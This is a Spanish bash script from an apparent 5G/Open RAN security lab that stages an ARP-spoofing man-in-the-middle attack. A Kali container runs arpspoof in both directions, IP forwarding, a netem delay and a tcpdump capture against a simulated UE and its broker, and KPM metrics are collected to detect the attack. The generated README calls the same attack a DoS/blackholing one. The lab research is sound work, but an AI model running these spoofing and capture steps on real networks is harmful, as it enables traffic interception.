#!/bin/bash
# =============================================================================
# Escenario 02 - Man-in-the-Middle por ARP spoofing
# -----------------------------------------------------------------------------
# Un contenedor atacante (Kali) se inserta entre UE3 y el broker envenenando
# las tablas ARP de AMBOS extremos. Con reenvio IP activo, el atacante captura
# el trafico y lo reenvia: interceptacion transparente (MitM), no corte.
#
# Metodo tomado de la practica de Seguridad en Redes LAN (Master): envenenar
# los dos extremos (arpspoof en ambos sentidos) + reenvio IP + captura. La
# victima casi no nota el ataque salvo por un pequeno retardo extra: esa es la
# firma a detectar.
#
#            Normal:  UE3 ──────────────► broker
#            Con MitM: UE3 ──► [KALI captura+reenvia] ──► broker
#
# IMPORTANTE: sobre el enlace ZMQ (muestras de radio a gran caudal) la
# interceptacion es sensible al volumen. Se usa trafico bajo (50 Kbps) para que
# el atacante de abasto y el ataque sea interceptacion estable, no corte.
#
# El laboratorio arranca NORMAL. El atacante entra despues, sin tocar la
# configuracion de la victima.
#
# Uso:
#   ./escenarios/02-intermediario/ataque.sh           180 s, 80 ms de retardo
#   ./escenarios/02-intermediario/ataque.sh 180 40    180 s, 40 ms de retardo
# =============================================================================
set -uo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")/../.."

VERDE='\033[0;32m'; AMAR='\033[1;33m'; ROJO='\033[0;31m'; NC='\033[0m'
ok()   { echo -e "${VERDE}[OK]${NC} $1"; }
avis() { echo -e "${AMAR}[AVISO]${NC} $1"; }
err()  { echo -e "${ROJO}[FALLO]${NC} $1"; }

DUR="${1:-180}"
RETARDO_MS="${2:-30}"   # retardo del salto extra (huella del MitM)
C="docker compose -f docker-compose.yaml -f docker-compose.multiue.yml"
UES="ue-srsue ue-srsue2 ue-srsue3"
METRICAS="DRB.UEThpDl,DRB.UEThpUl,DRB.RlcSduDelayDl,DRB.RlcDelayUl,DRB.RlcSduTransmittedVolumeDL,DRB.RlcSduTransmittedVolumeUL"

VICTIMA_IP="10.0.0.32"       # UE3
BROKER_IP="10.0.0.35"
RED="tfg-openran-lab_oran_5g_net"
ATACANTE="lab-attacker"

CAUDAL_NORMAL=("50K" "50K" "50K")
INICIO=$((DUR / 3))
FIN=$((2 * DUR / 3))

SESION="data/escenarios/02-mitm-arp-$(date +%Y%m%d-%H%M)"
SESION_ABS="$(pwd)/$SESION"
E2_NODO=""

echo ""
echo "=========================================================="
echo "  Escenario 02 - MitM por ARP spoofing"
echo "  Victima: UE3 ($VICTIMA_IP)   Objetivo: broker ($BROKER_IP)"
echo "  Duracion: ${DUR}s  |  Ataque: ${INICIO}s -> ${FIN}s"
echo "  Objetivo: interceptar el trafico de UE3 (MitM transparente)"
echo "=========================================================="

echo ""
docker ps --format '{{.Names}}' | grep -q '^ran-du$' || {
    err "El laboratorio base no esta levantado. Ejecuta: ./start-lab.sh"; exit 1; }
ok "Laboratorio base levantado"

mkdir -p "$SESION"

# --- Preparar y arrancar el escenario normal --------------------------------
$C stop ue-simulado ue2 ue3 >/dev/null 2>&1
docker rm -f ue-broker "$ATACANTE" >/dev/null 2>&1
sleep 3
sudo rm -f logs/ue/*.pcap logs/ran/du/*.pcap logs/ran/cu_cp/*.pcap logs/ue/iperf_*.log 2>/dev/null
(cd oran-sc-ric && docker compose exec -T python_xapp_runner rm -f /tmp/metricas_sesion.csv >/dev/null 2>&1)

echo ""
echo ">> Levantando el laboratorio multi-UE normal"
./lab-multiue.sh > "$SESION_ABS/arranque.log" 2>&1
grep -q "operativo con 3 terminal" "$SESION_ABS/arranque.log" \
    && ok "Escenario multi-UE operativo" \
    || { err "El escenario no arranco; ver arranque.log"; exit 1; }

# --- Servidor de trafico ----------------------------------------------------
docker exec core-upf sh -c 'pkill iperf3 2>/dev/null; exit 0'; sleep 1
for p in 5201 5202 5203; do docker exec -d core-upf iperf3 -s -B 10.45.0.1 -p $p; done
sleep 2
ok "Servidor de trafico en marcha"

# --- Interfaz E2 ------------------------------------------------------------
e2c() { docker exec ric_e2mgr curl -s http://localhost:3800/v1/nodeb/states 2>/dev/null \
        | grep -o '"connectionStatus":"CONNECTED"' | wc -l; }
METRICAS_OK=0
if docker ps --format '{{.Names}}' | grep -q '^ric_e2mgr$'; then
    # El E2 se cae con frecuencia tras reiniciar la DU. Se reintenta hasta 3
    # veces: cada vuelta reinicia e2term, luego la DU, y espera a que ambos
    # nodos queden CONNECTED antes de seguir.
    for intento in 1 2 3; do
        [ "$(e2c)" -ge 2 ] && break
        avis "E2 desconectado (intento $intento/3); reiniciando e2term y DU"
        (cd oran-sc-ric && docker compose restart e2term >/dev/null 2>&1); sleep 30
        $C restart ocudu-du >/dev/null 2>&1; sleep 80
    done
    if [ "$(e2c)" -ge 2 ]; then
        E2_NODO=$(docker exec ric_e2mgr curl -s http://localhost:3800/v1/nodeb/states 2>/dev/null \
            | grep -oE '"inventoryName":"gnbd_[^"]*"' | head -1 | sed 's/.*:"//;s/"//')
        cp xapp_ai/kpm_csv_xapp.py oran-sc-ric/xApps/python/ 2>/dev/null
        chmod +x oran-sc-ric/xApps/python/kpm_csv_xapp.py 2>/dev/null
        ok "Nodo E2: $E2_NODO"; METRICAS_OK=1
    else
        avis "Sin E2: sesion sin metricas"
    fi
fi

# --- Preparar el contenedor atacante ----------------------------------------
echo ""
echo ">> Preparando el contenedor atacante (Kali)"
docker run -d --name "$ATACANTE" --network "$RED" \
    --cap-add=NET_ADMIN --cap-add=NET_RAW \
    --sysctl net.ipv4.ip_forward=1 \
    kalilinux/kali-rolling sleep infinity >/dev/null 2>&1

# Herramientas: dsniff trae arpspoof; tcpdump para capturar; iproute2 para tc
echo "   Instalando herramientas (puede tardar 1-2 min la primera vez)..."
docker exec "$ATACANTE" sh -c \
    "apt-get update -qq && apt-get install -y -qq dsniff tcpdump iproute2 >/dev/null 2>&1"
if docker exec "$ATACANTE" which arpspoof >/dev/null 2>&1; then
    ok "Atacante listo (arpspoof, tcpdump, tc)"
else
    err "No se instalaron las herramientas en el atacante"
    docker rm -f "$ATACANTE" >/dev/null 2>&1; exit 1
fi

ATK_IP=$(docker exec "$ATACANTE" sh -c "ip -4 addr show eth0 | grep -oE 'inet [0-9.]+' | awk '{print \$2}'")
ok "IP del atacante: $ATK_IP"

# --- Metricas en marcha -----------------------------------------------------
if [ "$METRICAS_OK" = "1" ]; then
    # Matar cualquier xApp anterior que haya dejado el puerto HTTP ocupado
    # (si no, la nueva falla con "Address already in use" y no recoge nada)
    (cd oran-sc-ric && docker compose exec -T python_xapp_runner \
        pkill -f kpm_csv_xapp >/dev/null 2>&1) || true
    sleep 2
    (cd oran-sc-ric && docker compose exec -T python_xapp_runner ./kpm_csv_xapp.py \
        --e2_node_id="$E2_NODO" --metrics="$METRICAS" --kpm_report_style=5 \
        --output=/tmp/metricas_sesion.csv --duration=$((DUR + 10)) \
        > "$SESION_ABS/xapp.log" 2>&1) &
    XAPP_PID=$!
    sleep 3
fi

# --- Trafico normal en los tres terminales ----------------------------------
echo ""
echo ">> FASE 1: trafico normal ($INICIO s), sin ataque"
i=0
for c in $UES; do
    p=$((5201 + i))
    docker exec -d "$c" sh -c "iperf3 -c 10.45.0.1 -p $p -b ${CAUDAL_NORMAL[$i]} -t $DUR -i 5 --logfile /tmp/iperf_${c}.log"
    i=$((i+1))
done
sleep "$INICIO"

# --- FASE 2: el ataque ------------------------------------------------------
echo ">> FASE 2: ATAQUE - insertando el intermediario por ARP spoofing"

# 0. PROTEGER EL E2 de forma robusta.
# El E2 cae porque el envenenamiento ARP, aunque dirigido a UE3 y al broker,
# perturba la resolucion ARP de la DU (misma subred 10.0.0.0/24), y la DU
# pierde su conexion con el RIC. La proteccion efectiva es fijar en la DU
# entradas ARP ESTATICAS de los nodos con los que habla, de modo que ningun
# ARP falso pueda alterarlas.
echo "   Protegiendo la DU con entradas ARP estaticas..."
# MAC reales de los vecinos de la DU, tomadas ANTES del ataque
GW_MAC=$(docker exec ran-du sh -c "ip neigh show 10.0.0.1 | awk '{print \$5}'" 2>/dev/null)
BRK_MAC=$(docker exec ue-broker sh -c "cat /sys/class/net/eth0/address" 2>/dev/null)
# Fijar en la DU la MAC de su gateway (ruta hacia el RIC) como estatica
if [ -n "$GW_MAC" ]; then
    docker exec ran-du ip neigh replace 10.0.0.1 lladdr "$GW_MAC" nud permanent 2>/dev/null || true
    ok "ARP de la DU fijado (gateway $GW_MAC protegido)"
fi

# El atacante descarta ademas cualquier reenvio que no sea UE3<->broker
docker exec "$ATACANTE" sh -c "
    iptables -F FORWARD 2>/dev/null
    iptables -P FORWARD DROP 2>/dev/null
    iptables -A FORWARD -s $VICTIMA_IP -d $BROKER_IP -j ACCEPT 2>/dev/null
    iptables -A FORWARD -s $BROKER_IP -d $VICTIMA_IP -j ACCEPT 2>/dev/null
" 2>/dev/null || true
ok "Atacante limitado a reenviar SOLO el trafico UE3<->broker"

# 1. Comprobar que el reenvio IP esta activo (se puso con --sysctl al crear
#    el contenedor; sin el, el atacante corta el trafico en vez de reenviarlo)
fwd=$(docker exec "$ATACANTE" cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)
if [ "$fwd" = "1" ]; then
    ok "Reenvio IP activo (el trafico se reenviara, no se cortara)"
else
    err "Reenvio IP NO activo: el ataque cortaria el trafico. Abortando."
    docker rm -f "$ATACANTE" >/dev/null 2>&1
    $C stop ue-simulado ue2 ue3 >/dev/null 2>&1
    exit 1
fi

# 2. Retardo del salto extra (la huella del intermediario en las metricas)
docker exec "$ATACANTE" tc qdisc add dev eth0 root netem delay "${RETARDO_MS}ms" 2>/dev/null || true

# 3. Captura del trafico interceptado (la prueba del espionaje)
# -s 96: solo cabeceras (no la carga IQ, que son megas/s y llenaria el disco)
# -c 20000: tope de paquetes. Es una PRUEBA de intercepcion, no un volcado.
docker exec -d "$ATACANTE" sh -c \
    "tcpdump -i eth0 -s 96 -c 20000 -w /tmp/interceptado.pcap host $VICTIMA_IP and host $BROKER_IP"

# 4. Envenenamiento ARP en ambos sentidos: victima <-> broker a traves del atacante
docker exec -d "$ATACANTE" arpspoof -i eth0 -t "$VICTIMA_IP" "$BROKER_IP"
docker exec -d "$ATACANTE" arpspoof -i eth0 -t "$BROKER_IP" "$VICTIMA_IP"
ok "ARP spoofing activo"
sleep 3

# Forzar que UE3 reconecte: con el ARP ya envenenado, su nueva conexion ZMQ
# nace desviada hacia el atacante (el ARP captura mejor conexiones nuevas que
# las ya establecidas). Esto es lo que hace que la interceptacion funcione.
echo "   Reiniciando UE3 para que reconecte a traves del atacante..."
$C restart ue3 >/dev/null 2>&1
ok "UE3 reconectando con el ARP envenenado"

sleep $((FIN - INICIO))

# --- FASE 3: fin del ataque -------------------------------------------------
echo ">> FASE 3: deteniendo el ataque, vuelta a la normalidad"
docker exec "$ATACANTE" sh -c "pkill arpspoof; tc qdisc del dev eth0 root 2>/dev/null; pkill tcpdump" 2>/dev/null || true
sleep $((DUR - FIN + 5))
ok "Trafico completado"

# --- Recoger resultados -----------------------------------------------------
for c in $UES; do
    docker exec "$c" cat "/tmp/iperf_${c}.log" > "$SESION/iperf_${c}.txt" 2>/dev/null
done
docker cp "$ATACANTE":/tmp/interceptado.pcap "$SESION/interceptado.pcap" 2>/dev/null \
    && ok "Trafico interceptado por el atacante: $SESION/interceptado.pcap"

if [ "$METRICAS_OK" = "1" ]; then
    # Timeout: si el ataque tumba el E2, la xApp deja de recibir y no termina
    # sola. Se espera como maximo 40 s extra y luego se la fuerza a cerrar.
    for _ in $(seq 1 40); do
        kill -0 "$XAPP_PID" 2>/dev/null || break
        sleep 1
    done
    if kill -0 "$XAPP_PID" 2>/dev/null; then
        avis "La xApp no cerro (el ataque pudo afectar al E2); forzando"
        (cd oran-sc-ric && docker compose exec -T python_xapp_runner \
            pkill -f kpm_csv_xapp >/dev/null 2>&1) || true
        kill "$XAPP_PID" 2>/dev/null || true
    fi
    wait "$XAPP_PID" 2>/dev/null || true
    (cd oran-sc-ric && docker compose exec -T python_xapp_runner cat /tmp/metricas_sesion.csv 2>/dev/null) > "$SESION_ABS/metricas.csv"
    n=$(($(wc -l < "$SESION/metricas.csv") - 1))
    [ "$n" -gt 0 ] && ok "Metricas recogidas: $n filas" || avis "Metricas vacias"
fi

echo ""
echo ">> Parando terminales y atacante"
$C stop ue-simulado ue2 ue3 >/dev/null 2>&1
docker rm -f "$ATACANTE" >/dev/null 2>&1
sleep 8
cp logs/ue/*.pcap logs/ran/du/du_mac.pcap logs/ran/cu_cp/*.pcap "$SESION/" 2>/dev/null

# --- Ficha ------------------------------------------------------------------
cat > "$SESION/README.md" << FICHA
# Sesion: DoS por ARP spoofing (Blackholing)

**Fecha:** $(date '+%Y-%m-%d %H:%M')  **Duracion:** ${DUR}s

## Ataque

Un contenedor atacante (Kali) envenena las tablas ARP del enlace UE3
($VICTIMA_IP) <-> broker ($BROKER_IP). Sobre el enlace ZMQ, el ARP spoofing
degrada y corta la conexion en lugar de interceptarla: es un ataque de
denegacion de servicio (ARP Blackholing).

El laboratorio arranco normal; el atacante entro despues.

| Fase | Intervalo | Estado |
|---|---|---|
| Normal | 0 - ${INICIO}s | Sin ataque |
| Ataque | ${INICIO} - ${FIN}s | ARP spoofing + retardo + captura |
| Normal | ${FIN} - ${DUR}s | Ataque detenido |

## Que buscar

- **Caudal de UE3**: debe caer durante el ataque (el enlace se degrada/corta).
- **Retardo de UE3**: se dispara a valores muy altos (segundos), senal de que
  los paquetes no llegan a tiempo.
- **Posible afectacion a UE1 y UE2**: el ARP spoofing es poco selectivo y puede
  degradar tambien a los demas, lo que es tipico de este ataque.
- **interceptado.pcap**: evidencia del trafico desviado al atacante.

## Comparar con la linea base

\`\`\`bash
./graficas.py $SESION
./graficas.py --comparar data/capturas/<base-holgado> $SESION
\`\`\`
FICHA

echo ""
echo "=========================================================="
ok "Sesion guardada en $SESION"
echo "  Trafico interceptado: $SESION/interceptado.pcap"
echo "  Graficas:  ./graficas.py $SESION"
echo "  Comparar:  ./graficas.py --comparar data/capturas/<base-holgado> $SESION"
echo "  Volver al base: ./lab-multiue.sh"
echo "=========================================================="
echo ""
